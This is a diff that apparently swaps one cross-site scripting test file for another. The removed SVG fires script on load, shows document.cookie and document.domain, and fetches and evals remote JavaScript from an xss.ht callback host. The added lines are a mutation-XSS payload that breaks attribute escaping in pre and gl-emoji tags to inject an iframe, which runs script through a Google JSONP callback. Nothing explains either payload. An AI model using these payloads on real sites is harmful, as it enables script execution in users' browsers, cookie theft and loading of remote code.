@@ -1,14 +1,6 @@
-<?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" onload="document.write(document.domain)">
-   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400" onclick="myFunction()"/>
-   <script type="text/javascript">
-      confirm(document.cookie);
-  </script>
-   <script type="text/javascript">
-      confirm(document.domain);
-  </script>
-   <script type="text/javascript">
-   	function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://zheev.xss.ht");a.send();
-   </script>
-</svg>
+<pre data-sourcepos="&#34;></pre>
+<gl-emoji data-name='&#34;x=&#34y&#34><iframe srcdoc=&#34;<script src=https://apis.google.com/complete/search?client=chrome&amp;q=alert(document.domain);//&amp;callback=setTimeout></script>&#34;' data-unicode-version='x'>
+abc
+</gl-emoji>
+<pre x=&#34;">
+<code></code></pre>
